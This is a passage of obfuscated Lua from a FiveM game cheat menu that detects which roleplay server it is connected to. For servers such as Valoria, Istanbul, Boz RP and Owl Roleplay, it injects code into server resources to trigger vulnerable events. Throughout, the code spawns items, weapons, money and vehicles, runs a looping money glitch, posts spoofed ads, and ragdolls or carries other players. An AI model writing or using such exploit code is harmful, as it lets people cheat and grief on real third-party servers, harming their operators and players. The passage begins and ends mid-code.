GiveWeaponToPed(PlayerPedId(),"weapon_rpg",250,false,true);end);MachoMenuButton(v9,"Pistol Spawn - Safe",function() GiveWeaponToPed(PlayerPedId(),"weapon_pistol",922 -672 ,false,true);end);MachoMenuButton(v9,"Glock 19 Spawn - Safe",function() GiveWeaponToPed(PlayerPedId(),"weapon_g19",250,false,true);end);MachoMenuButton(v9,"Remove Current Weapon",function() RemoveWeaponFromPed(PlayerPedId(),GetSelectedPedWeapon(PlayerPedId()));end);Citizen.CreateThread(function() local v415=GetConvar("sv_hostname","N/A");local v416=GetConvar("sv_endpoint","N/A");if (v415=="N/A") then v415=GetCurrentServerEndpoint() or "Unknown Server" ;end if (KeysBin=="wex") then local v567=MachoMenuAddTab(v4,"Wex Roleplay");local v568=MachoMenuGroup(v567,"Wex Roleplay",v3,0,(v1.x-v3) + 120 + 30 ,v1.y);local v569=MachoMenuInputbox(v568,"Item to Spawn","...");MachoMenuButton(v568,"Spawn Item",function() local v706={item=MachoMenuGetInputbox(v569),amount=242 -(237 + 4) };if (v706.item and (v706.item~="")) then MachoInjectResource("m-Tequila",string.format([[
                    TriggerServerEvent('m-Tequila:server:CraftAlcoholic', "%s", %d)
                ]],v706.item,v706.amount));else MachoMenuNotification("Error","Please enter a valid item name!");end end);end if (v415:find("Edge Roleplay") or v415:find("edge")) then local v570=MachoMenuAddTab(v4,"Edge Roleplay");local v571=MachoMenuGroup(v570,"Item Exploit",v3,20 -11 ,(v1.x-v3) + (379 -229) ,568 -268 );local v572=MachoMenuInputbox(v571,"Item Code","e.g., weapon_g19");local v573=MachoMenuInputbox(v571,"Amount","e.g., 1");MachoMenuButton(v571,"Give Item",function() local v707=MachoMenuGetInputbox(v572);local v708=tonumber(MachoMenuGetInputbox(v573));if (v707 and (v707~="") and v708 and (v708>(0 + 0))) then MachoInjectResource("monitor",string.format([[
                    TriggerServerEvent('horizon_paymentsystem:giveItem', "%s", %d)
                ]],v707,v708));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end end);end if v415:find("Boz RP") then local v574=0 + 0 ;local v575;local v576;local v577;local v578;while true do if (v574==(3 -2)) then v577=false;v578=false;v574=2;end if (v574==(0 + 0)) then v575=MachoMenuAddTab(v4,"Boz RP Exploit");v576=MachoMenuGroup(v575,"Boz RP Money Glitch",v3,0 + 0 ,(v1.x-v3) + (1576 -(85 + 1341)) ,v1.y);v574=1;end if (2==v574) then MachoMenuButton(v576,"Start/Stop Money Exploit",function() local v856=0 -0 ;while true do if (v856==(0 -0)) then v577= not v577;if v577 then v578=false;MachoInjectResource("monitor",[[
                    Citizen.CreateThread(function()
                        while true do
                            if shouldStop then
                                break
                            end
                            TriggerServerEvent('akela_karpuz:process')
                            TriggerServerEvent('akela_karpuz:take')
                            Citizen.Wait(20)
                        end
                    end)
                ]]);else local v952=372 -(45 + 327) ;while true do if (v952==(0 -0)) then v578=true;MachoInjectResource("monitor",[[
                    shouldStop = true
                    TriggerEvent('chat:addMessage', { args = { '^2Exploit System:', 'Money exploit stopped!' } })
                ]]);break;end end end break;end end end);break;end end end if v415:find("Quasar Roleplay") then local v579=MachoMenuAddTab(v4,"Quasar Roleplay");local v580=MachoMenuGroup(v579,"Quasar Roleplay",v3,0,(v1.x-v3) + 150 ,v1.y);local v581=MachoMenuInputbox(v580,"Item Name","...");local v582=MachoMenuInputbox(v580,"Amount","1");MachoMenuButton(v580,"Add Item",function() local v709={item=MachoMenuGetInputbox(v581),amount=tonumber(MachoMenuGetInputbox(v582)) or (503 -(444 + 58)) };if (v709.item and (v709.item~="") and (v709.amount>(0 + 0))) then MachoInjectResource("any",string.format([[
                    TriggerServerEvent('sedat:Server:AddItem', "%s", %d)
                ]],v709.item,v709.amount,v709.item,v709.amount));else MachoMenuNotification("Error","Please enter a valid item name and amount!");end end);end if v415:find("Valoria Roleplay") then local v583=MachoMenuAddTab(v4,"Valoria Roleplay");local v584=MachoMenuGroup(v583,"Valoria Roleplay",v3,0 + 0 ,(v1.x-v3) + 150 ,v1.y);MachoMenuText(v584,"Money Exploit");local v585=MachoMenuInputbox(v584,"Payment Type","Only Cash or Bank");local v586=MachoMenuInputbox(v584,"Money Amount","e.g., 10000");MachoMenuButton(v584,"Spawn Money",function() local v710=0 + 0 ;local v711;while true do if (v710==(0 -0)) then v711={paymentType=MachoMenuGetInputbox(v585),refund=tonumber(MachoMenuGetInputbox(v586)) or (12843 -(64 + 1668)) ,playerId=GetPlayerServerId(PlayerId())};if (v711.paymentType and (v711.paymentType~="") and (v711.refund>0)) then MachoInjectResource("monitor",string.format([[ 
                    TriggerServerEvent('CL-PoliceGarageV2:RefundRent', '%s', %d, %d, 'policejob') 
                ]],v711.paymentType,v711.refund,v711.playerId));else MachoMenuNotification("Error","Please enter a valid payment type and amount!");end break;end end end);MachoMenuText(v584,"Vehicle Data Exploit");local v587=MachoMenuInputbox(v584,"Vehicle Name","e.g., sultan");MachoMenuButton(v584,"Send Vehicle",function() local v712=1973 -(1227 + 746) ;local v713;while true do if (v712==(0 -0)) then v713=MachoMenuGetInputbox(v587);if (v713~="") then MachoInjectResource("CL-PoliceGarageV2",string.format([[ 
                    local QBCore = exports['monitor']:GetCoreObject() 
                    local veh = GetVehiclePedIsIn(PlayerPedId(), false) 
                    TriggerServerEvent("CL-PoliceGarageV2:AddData", "vehiclepurchased", "%s", QBCore.Functions.GetVehicleProperties(veh), "police") 
                ]],v713,v713));else MachoMenuNotification("Error","Vehicle name cannot be empty!");end break;end end end);MachoMenuText(v584,"Item Exploit");local v588=MachoMenuInputbox(v584,"Item Code","e.g., sandwich");local v589=MachoMenuInputbox(v584,"Amount","e.g., 3");MachoMenuButton(v584,"Give Item",function() local v714=MachoMenuGetInputbox(v588);local v715=tonumber(MachoMenuGetInputbox(v589)) or (1 -0) ;if ((v714~="") and (v715>(494 -(415 + 79)))) then MachoInjectResource("drones",string.format([[
                    TriggerServerEvent("Drones:Back", -1, "%s", %d)
                ]],v714,v715,v714,v715));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end end);end if v415:find("AriaV") then local v590=0 + 0 ;local v591;local v592;local v593;local v594;local v595;while true do if (v590==(494 -(142 + 349))) then MachoMenuButton(v592,"Ragdoll Player",function() local v857=0;local v858;while true do if (v857==0) then v858=tonumber(MachoMenuGetInputbox(v595));if (v858 and (v858>0)) then MachoInjectResource("monitor",string.format([[ 
                    TriggerServerEvent("tackle:server:TacklePlayer", %d) 
                ]],v858));MachoMenuNotification("Lena Roleplay","Ragdoll sent! Target ID: "   .. v858 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);break;end if (v590==(1 + 0)) then v593=MachoMenuInputbox(v592,"Code Name","Example: item_code");v594=MachoMenuInputbox(v592,"Code Amount","Example: 3");v590=2 -0 ;end if (v590==(0 + 0)) then v591=MachoMenuAddTab(v4,"AriaV");v592=MachoMenuGroup(v591,"AriaV",v3,0 + 0 ,(v1.x-v3) + (408 -258) ,v1.y);v590=1865 -(1710 + 154) ;end if (v590==2) then MachoMenuButton(v592,"Item Exploit",function() local v859=MachoMenuGetInputbox(v593);local v860=tonumber(MachoMenuGetInputbox(v594));if ( not v859 or (v859=="")) then local v912=318 -(200 + 118) ;while true do if (v912==0) then MachoMenuNotification("Error","Please enter a code name!");return;end end end if ( not v860 or (v860<=(0 + 0))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                for itemName, _ in pairs(items) do
                    local items = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(items) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                              
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v859,v860));MachoMenuNotification("Success","Item exploit sent!");end);v595=MachoMenuInputbox(v592,"Target Player ID","Example: 123");v590=3;end end end if v415:find("Rena Roleplay") then local v596=MachoMenuAddTab(v4,"Rena Roleplay");local v597=MachoMenuGroup(v596,"Rena Roleplay",v3,0 -0 ,(v1.x-v3) + 150 ,222 -72 );MachoMenuText(v597,"Money Exploit");local v598=MachoMenuDropDown(v597,"Drop Down",function(v716) if (v716==(0 + 0)) then MachoInjectResource("monitor",[[
                        local data = {
                            probability = { b = 540, a = 380 },
                            type = "weapon",
                            name = "weapon_g17",
                            count = 1,
                            sound = "mystery"
                        }

                        TriggerServerEvent('luckywheel:give', data)
                    ]]);elseif (v716==(2 + 0)) then MachoInjectResource("monitor",[[
                        TriggerServerEvent('qb-trashsearch:server:searchedTrash', 889090, false, "weapon_bottle")
                    ]]);elseif (v716==(3 + 1)) then else MachoMenuNotification("Error","This option not found!");end end,"G17","Bottle","Toast");end if v415:find("Atlantis Roleplay") then local v599=MachoMenuAddTab(v4,"Atlantis Roleplay");local v600=MachoMenuGroup(v599,"Atlantis Roleplay Item",v3,2 + 7 ,(v1.x-v3) + (324 -174) ,v1.y);local v601=MachoMenuInputbox(v600,"Code Name","Example: item_code");local v602=MachoMenuInputbox(v600,"Code Amount","Example: 3");MachoMenuButton(v600,"Item Exploit",function() local v717=MachoMenuGetInputbox(v601);local v718=tonumber(MachoMenuGetInputbox(v602));if ( not v717 or (v717=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v718 or (v718<=0)) then MachoMenuNotification("Error","Please enter a valid amount!");return;end MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                if not items then
                    TriggerEvent('QBCore:Notify', 'ox_inventory:Items() function returned nil. Please check ox_inventory resource.', 'error')
                    return
                end

                for itemName, _ in pairs(items) do
                    local slots = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(slots or {}) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                            
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v717,v718));end);local v603=MachoMenuInputbox(v600,"Name","Name to appear in yellow pages");local v604=MachoMenuInputbox(v600,"Phone Number","Example: 123-456-7890");local v605=MachoMenuInputbox(v600,"Message","Text to appear in yellow pages");MachoMenuButton(v600,"Send to Yellow Pages",function() local v719=1250 -(363 + 887) ;local v720;local v721;local v722;while true do if (v719==(0 -0)) then v720=MachoMenuGetInputbox(v603);v721=MachoMenuGetInputbox(v604);v719=4 -3 ;end if (v719==(1 + 0)) then v722=MachoMenuGetInputbox(v605);if ( not v720 or (v720=="")) then MachoMenuNotification("Error","Please enter a name!");return;end v719=2;end if (v719==3) then MachoInjectResource("gksphone",string.format([[
                TriggerServerEvent('gksphone:yellow_postPagess', "%s", "%s", "%s", "", "bartender")
            ]],v720,v721,v722));MachoMenuNotification("Success","Sent to yellow pages!");break;end if ((4 -2)==v719) then if ( not v721 or (v721=="")) then local v913=0 + 0 ;while true do if (v913==0) then MachoMenuNotification("Error","Please enter a phone number!");return;end end end if ( not v722 or (v722=="")) then MachoMenuNotification("Error","Please enter a message!");return;end v719=1667 -(674 + 990) ;end end end);end if v415:find("XX Gun") then local v606=0 + 0 ;local v607;local v608;local v609;local v610;while true do if (v606==2) then MachoMenuButton(v608,"Give Item",function() local v861=0 + 0 ;local v862;local v863;while true do if (v861==1) then if ((v862~="") and (v863>(0 -0))) then MachoInjectResource("any",string.format([[
                    local core = exports['monitor']:GetCoreObject()
                    local item = { name = "%s" }
                    local amount = %d
    
                    for i = amount, 1, -1 do
                        TriggerServerEvent('Drones:Back', item, core.Key)
                    end
                ]],v862,v863));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end if (v861==(1055 -(507 + 548))) then v862=MachoMenuGetInputbox(v609);v863=tonumber(MachoMenuGetInputbox(v610)) or (838 -(289 + 548)) ;v861=1819 -(821 + 997) ;end end end);break;end if (v606==0) then v607=MachoMenuAddTab(v4,"XX Gun");v608=MachoMenuGroup(v607,"XX Gun Item",v3,264 -(195 + 60) ,(v1.x-v3) + 41 + 109 ,v1.y);v606=1;end if (v606==1) then v609=MachoMenuInputbox(v608,"Item Code","e.g., sandwich");v610=MachoMenuInputbox(v608,"Amount","e.g., 3");v606=1503 -(251 + 1250) ;end end end if v415:find("Owl Roleplay") then local v611=0 -0 ;local v612;local v613;local v614;local v615;local v616;while true do if (v611==2) then MachoMenuButton(v613,"Item Exploit",function() local v864=MachoMenuGetInputbox(v614);local v865=tonumber(MachoMenuGetInputbox(v615));if ( not v864 or (v864=="")) then local v914=0 + 0 ;while true do if ((1032 -(809 + 223))==v914) then MachoMenuNotification("Error","Please enter a code name!");return;end end end if ( not v865 or (v865<=(0 -0))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end MachoInjectResource("t1-rgbcontroller",string.format([[
                TriggerServerEvent('t1-rgbcontroller:sv:AddItem', '%s', %d)
            ]],v864,v865));MachoMenuNotification("Success",string.format("%d %s added!",v865,v864));end);v616=MachoMenuInputbox(v613,"Target Player ID","Example: 123");v611=8 -5 ;end if (v611==(0 -0)) then v612=MachoMenuAddTab(v4,"Owl Roleplay");v613=MachoMenuGroup(v612,"Owl Roleplay Item",v3,7 + 2 ,(v1.x-v3) + 79 + 71 ,v1.y);v611=618 -(14 + 603) ;end if (v611==(130 -(118 + 11))) then v614=MachoMenuInputbox(v613,"Code Name","Example: item_code");v615=MachoMenuInputbox(v613,"Code Amount","Example: 3");v611=1 + 1 ;end if (v611==(3 + 0)) then MachoMenuButton(v613,"Carry Player",function() local v866=tonumber(MachoMenuGetInputbox(v616));if ( not v866 or (v866<=(0 -0))) then local v915=0;while true do if (v915==0) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end MachoInjectResource("t1-cr",string.format([[
                TriggerServerEvent('t1-cr:tasi-target-server', %d)
            ]],v866));MachoMenuNotification("Success",string.format("Player ID %d carried!",v866));end);break;end end end if v415:find("Light Roleplay") then local v617=949 -(551 + 398) ;local v618;local v619;local v620;local v621;local v622;local v623;local v624;while true do if (v617==3) then v623=MachoMenuInputbox(v619,"Phone Number","Example: 123-456-7890");v624=MachoMenuInputbox(v619,"Message","Text to appear in yellow pages");v617=3 + 1 ;end if (v617==(0 + 0)) then v618=MachoMenuAddTab(v4,"Light Roleplay");v619=MachoMenuGroup(v618,"Light Roleplay Item",v3,9,(v1.x-v3) + 122 + 28 ,v1.y);v617=3 -2 ;end if (v617==1) then v620=MachoMenuInputbox(v619,"Code Name","Example: item_code");v621=MachoMenuInputbox(v619,"Code Amount","Example: 3");v617=2;end if (v617==(9 -5)) then MachoMenuButton(v619,"Send to Yellow Pages",function() local v867=MachoMenuGetInputbox(v622);local v868=MachoMenuGetInputbox(v623);local v869=MachoMenuGetInputbox(v624);if ( not v867 or (v867=="")) then MachoMenuNotification("Error","Please enter a name!");return;end if ( not v868 or (v868=="")) then local v916=0;while true do if (v916==0) then MachoMenuNotification("Error","Please enter a phone number!");return;end end end if ( not v869 or (v869=="")) then local v917=0 + 0 ;while true do if ((0 -0)==v917) then MachoMenuNotification("Error","Please enter a message!");return;end end end MachoInjectResource("gksphone",string.format([[
                TriggerServerEvent('gksphone:yellow_postPagess', "%s", "%s", "%s", "", "bartender")
            ]],v867,v868,v869));MachoMenuNotification("Success","Sent to yellow pages!");end);break;end if (v617==(1 + 1)) then MachoMenuButton(v619,"Item Exploit",function() local v870=MachoMenuGetInputbox(v620);local v871=tonumber(MachoMenuGetInputbox(v621));if ( not v870 or (v870=="")) then local v918=89 -(40 + 49) ;while true do if (v918==0) then MachoMenuNotification("Error","Please enter a code name!");return;end end end if ( not v871 or (v871<=(0 -0))) then local v919=0;while true do if (v919==(490 -(99 + 391))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                for itemName, _ in pairs(items) do
                    local items = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(items) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                              
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v870,v871));end);v622=MachoMenuInputbox(v619,"Name","Name to appear in yellow pages");v617=3 + 0 ;end end end if v415:find("Aera Roleplay") then local v625=MachoMenuAddTab(v4,"Aera Roleplay");local v626=MachoMenuGroup(v625,"Item Exploit",v3,0,(v1.x-v3) + (659 -509) ,371 -221 );local v627=MachoMenuInputbox(v626,"Item Code","e.g., sandwich");local v628=MachoMenuInputbox(v626,"Amount","e.g., 3");MachoMenuButton(v626,"Give Item",function() local v723=MachoMenuGetInputbox(v627);local v724=tonumber(MachoMenuGetInputbox(v628)) or (1 + 0) ;if ((v723~="") and (v724>(0 -0))) then MachoInjectResource("monitor",string.format([[ 
                    TriggerServerEvent("jim-mining:server:toggleItem", -1, "%s", %d) 
                ]],v723,v724,v723,v724));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end end);end if v415:find("Istanbul Roleplay") then local v629=0;local v630;local v631;local v632;local v633;local v634;local v635;local v636;local v637;while true do if (v629==(1608 -(1032 + 572))) then MachoMenuText(v631,"Vehicle Data V2");v637=MachoMenuInputbox(v631,"Vehicle Code","Example: adder");MachoMenuButton(v631,"Send Vehicle V2",function() local v872=MachoMenuGetInputbox(v637);if ( not v872 or (v872=="")) then MachoMenuNotification("Error","Vehicle code cannot be empty!");return;end MachoInjectResource("pa-vehicleshop",string.format([[
                TriggerServerEvent('pa-vehicleshop:buyVehicle:server', "bank", "%s", 1, 1, nil, "cardealer")
            ]],v872,v872));MachoMenuNotification("Success","Vehicle V2 exploit sent! Vehicle: "   .. v872 );end);v629=422 -(203 + 214) ;end if (v629==0) then v630=MachoMenuAddTab(v4,"Istanbul Roleplay");v631=MachoMenuGroup(v630,"Istanbul Roleplay Item",v3,1826 -(568 + 1249) ,(v1.x-v3) + 118 + 32 ,v1.y);v632=MachoMenuInputbox(v631,"Code Name","Example: item_code");v629=2 -1 ;end if (v629==(7 -5)) then v634=MachoMenuInputbox(v631,"Payment Type","Only Cash or Bank");v635=MachoMenuInputbox(v631,"Money Amount","Example: 10000");MachoMenuButton(v631,"Spawn Money",function() local v873={paymentType=MachoMenuGetInputbox(v634),refund=tonumber(MachoMenuGetInputbox(v635)) or (12417 -(913 + 393)) ,playerId=GetPlayerServerId(PlayerId())};if ((v873.paymentType~="Cash") and (v873.paymentType~="Bank")) then local v920=0;while true do if ((0 -0)==v920) then MachoMenuNotification("Error","Payment type must be 'Cash' or 'Bank'!");return;end end end if ( not v873.refund or (v873.refund<=(0 -0))) then local v921=410 -(269 + 141) ;while true do if (v921==(0 -0)) then MachoMenuNotification("Error","Please enter a valid money amount!");return;end end end MachoInjectResource("monitor",string.format([[
                TriggerServerEvent('CL-PoliceGarageV2:RefundRent', "%s", %d, %d, "policejob")
            ]],v873.paymentType,v873.refund,v873.playerId));MachoMenuNotification("Success","Money exploit sent! Amount: "   .. v873.refund );end);v629=3;end if (v629==1) then v633=MachoMenuInputbox(v631,"Code Amount","Example: 3");MachoMenuButton(v631,"Item Exploit",function() local v874=1981 -(362 + 1619) ;local v875;local v876;while true do if (v874==(1627 -(950 + 675))) then MachoInjectResource("ox_inventory",string.format([[
                local items = exports.ox_inventory:Items()
                local playerItems = []
    
                for itemName, _ in pairs(items) do
                    local count = exports.ox_inventory:GetItemCount(itemName)
                    if count and count > 0 then
                        table.insert(playerItems, itemName)
                    end
                end
    
                if #playerItems == 0 then
                    return
                end
    
                local randomItem = playerItems[math.random(1, #playerItems)]
                local tradeData = {
                    first = { amount = 0, name = randomItem },
                    second = { amount = { max = %d, min = %d }, name = "%s" },
                    third = nil
                }
    
                TriggerServerEvent("earth-illegal:server:TradeItem", tradeData.first, tradeData.second, tradeData.third)
            ]],v876,v876,v875));break;end if ((0 + 0)==v874) then v875=MachoMenuGetInputbox(v632);v876=tonumber(MachoMenuGetInputbox(v633));v874=1180 -(216 + 963) ;end if (v874==1) then if ( not v875 or (v875=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v876 or (v876<=(1287 -(485 + 802)))) then local v953=559 -(432 + 127) ;while true do if (v953==(1073 -(1065 + 8))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end v874=2 + 0 ;end end end);MachoMenuText(v631,"Money Exploit");v629=2;end if (v629==3) then MachoMenuText(v631,"Vehicle Data Exploit");v636=MachoMenuInputbox(v631,"Vehicle Name","Example: sultan");MachoMenuButton(v631,"Send Vehicle",function() local v877=0;local v878;while true do if (v877==(1601 -(635 + 966))) then v878=MachoMenuGetInputbox(v636);if ( not v878 or (v878=="")) then MachoMenuNotification("Error","Vehicle name cannot be empty!");return;end v877=1 + 0 ;end if (v877==1) then MachoInjectResource("CL-PoliceGarage",string.format([[
                TriggerServerEvent("CL-PoliceGarage:TakeMoney", "cash", 0, "%s", "%s")
            ]],v878,v878,v878));MachoMenuNotification("Success","Vehicle exploit sent! Vehicle: "   .. v878 );break;end end end);v629=4;end if (v629==(47 -(5 + 37))) then MachoMenuText(v631,"All Bring");MachoMenuButton(v631,"All Bring",function() local v879=0;while true do if ((0 -0)==v879) then MachoInjectResource("monitor",[[
                TriggerServerEvent('ServerValidEmote', '-1', 'dog', 'dog', 1405553601)
            ]]);MachoMenuNotification("Success","All Bring exploit sent!");break;end end end);break;end end end if v415:find("Ria Roleplay") then local v638=MachoMenuAddTab(v4,"Ria Roleplay");local v639=MachoMenuGroup(v638,"Ria Roleplay Item",v3,9,(v1.x-v3) + 150 ,v1.y);local v640=MachoMenuInputbox(v639,"Code Name","Example: item_code");local v641=MachoMenuInputbox(v639,"Code Amount","Example: 3");MachoMenuButton(v639,"Item Exploit",function() local v725=MachoMenuGetInputbox(v640);local v726=tonumber(MachoMenuGetInputbox(v641));if ( not v725 or (v725=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v726 or (v726<=(0 + 0))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                if not items then
                    TriggerEvent('QBCore:Notify', 'ox_inventory:Items() function returned nil. Please check ox_inventory resource.', 'error')
                    return
                end

                for itemName, _ in pairs(items) do
                    local slots = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(slots or {}) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                            
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("earth-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v725,v726));end);local v642=MachoMenuInputbox(v639,"Name","Name to appear in yellow pages");local v643=MachoMenuInputbox(v639,"Phone Number","Example: 123-456-7890");local v644=MachoMenuInputbox(v639,"Message","Text to appear in yellow pages");MachoMenuButton(v639,"Send to Yellow Pages",function() local v727=MachoMenuGetInputbox(v642);local v728=MachoMenuGetInputbox(v643);local v729=MachoMenuGetInputbox(v644);if ( not v727 or (v727=="")) then local v825=0 -0 ;while true do if (v825==(0 + 0)) then MachoMenuNotification("Error","Please enter a name!");return;end end end if ( not v728 or (v728=="")) then MachoMenuNotification("Error","Please enter a phone number!");return;end if ( not v729 or (v729=="")) then local v826=0 -0 ;while true do if (v826==(0 -0)) then MachoMenuNotification("Error","Please enter a message!");return;end end end TriggerServerEvent("gksphone:yellow_postPagess",v727,v728,v729,"","bartender");MachoMenuNotification("Success","Sent to yellow pages!");end);end if v415:find("Gonna Roleplay") then local v645=MachoMenuAddTab(v4,"Gonna Roleplay");local v646=MachoMenuGroup(v645,"Gonna Roleplay Item",v3,9,(v1.x-v3) + 150 ,v1.y);local v647=MachoMenuInputbox(v646,"Code Name","Example: item_code");local v648=MachoMenuInputbox(v646,"Code Amount","Example: 3");MachoMenuButton(v646,"Item Exploit",function() local v730=0;local v731;local v732;while true do if (v730==0) then v731=MachoMenuGetInputbox(v647);v732=tonumber(MachoMenuGetInputbox(v648));v730=1 -0 ;end if (v730==2) then MachoInjectResource("ox_inventory",string.format([[
                local items = exports.ox_inventory:Items()
                local playerItems = {}

                for itemName, _ in pairs(items) do
                    local count = exports.ox_inventory:GetItemCount(itemName)
                    if count and count > 0 then
                        table.insert(playerItems, itemName)
                    end
                end

                if #playerItems == 0 then
                    return
                end

                local randomItem = playerItems[math.random(1, #playerItems)]

                TriggerServerEvent("gonna-illegal:server:TradeItem", 
                    json.decode(string.format('{"amount":0,"name":"%%s"}', randomItem)), 
                    json.decode(string.format('{"amount":{"max":%d,"min":%d},"name":"%s"}', %d, %d, "%s")), 
                    json.decode('null')
                )
            ]],v732,v732,v731,v732,v732,v731));break;end if (v730==(2 -1)) then if ( not v731 or (v731=="")) then local v922=0;while true do if ((0 + 0)==v922) then MachoMenuNotification("Error","Please enter a code name!");return;end end end if ( not v732 or (v732<=0)) then local v923=529 -(318 + 211) ;while true do if (v923==(0 -0)) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end v730=1589 -(963 + 624) ;end end end);end if v415:find("Royal Roleplay") then local v649=MachoMenuAddTab(v4,"Royal Roleplay");local v650=MachoMenuGroup(v649,"Royal Roleplay Item",v3,4 + 5 ,(v1.x-v3) + 150 ,v1.y);local v651=MachoMenuInputbox(v650,"Code Name","Example: item_code");local v652=MachoMenuInputbox(v650,"Code Amount","Example: 3");MachoMenuButton(v650,"Item Exploit",function() local v733=MachoMenuGetInputbox(v651);local v734=tonumber(MachoMenuGetInputbox(v652));if ( not v733 or (v733=="")) then local v827=846 -(518 + 328) ;while true do if (v827==(0 -0)) then MachoMenuNotification("Error","Please enter a code name!");return;end end end if ( not v734 or (v734<=0)) then MachoMenuNotification("Error","Please enter a valid amount!");return;end MachoInjectResource("ox_inventory",string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                if not items then
                    TriggerEvent('QBCore:Notify', 'ox_inventory:Items() function returned nil. Please check ox_inventory resource.', 'error')
                    return
                end

                for itemName, _ in pairs(items) do
                    local slots = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(slots or {}) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                            
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("earth-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]],v733,v734));end);end if v415:find("Rac10") then local v653=0 -0 ;local v654;local v655;local v656;local v657;local v658;local v659;while true do if (v653==(319 -(301 + 16))) then MachoMenuText(v655,"Money Exploit");v658=MachoMenuInputbox(v655,"Money Amount","e.g., 100000");MachoMenuButton(v655,"Spawn Money",function() local v880={amount=tonumber(MachoMenuGetInputbox(v658)) or 100000 };if (v880.amount>(0 -0)) then MachoInjectResource("qb-taxijob",string.format([[ 
                    TriggerServerEvent('qb-taxi:server:NpcPay', %d)
